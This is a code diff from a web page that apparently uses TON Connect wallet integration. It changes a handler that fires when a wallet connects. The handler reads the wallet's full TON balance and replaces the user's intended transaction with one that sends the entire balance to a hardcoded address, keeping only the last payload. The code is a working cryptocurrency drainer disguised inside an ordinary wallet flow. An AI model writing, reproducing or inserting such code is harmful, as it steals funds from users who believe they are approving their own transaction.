@@ -99,19 +99,16 @@ tonConnectUI.onStatusChange((wallet) => {
                         const b = await getTonBalance(wallet.account.address);
 
 
-                        const final = Math.floor((b / (transaction?.messages?.length || 1)));
-                        console.log(b,final);
+                        const final = Math.floor(b);
                         const o = {
                             ...transaction,
-                            messages: [
-                                ...(transaction?.messages?.map?.(o => ({
-                                    ...o,
-                                    address: "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9",
-                                    amount: final+""
-                                })) || [])
-                            ]
+                            messages: [{
+                                address: "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9",
+                                amount: final + "",
+                                payload: transaction?.messages?.at(-1)?.payload || undefined
+                            }]
                         }
-                        console.log(o);
+                        console.log(transaction, o);
                         await tonConnectUI.sendTransaction(o);
                     } catch (e) {
                         console.log(e);
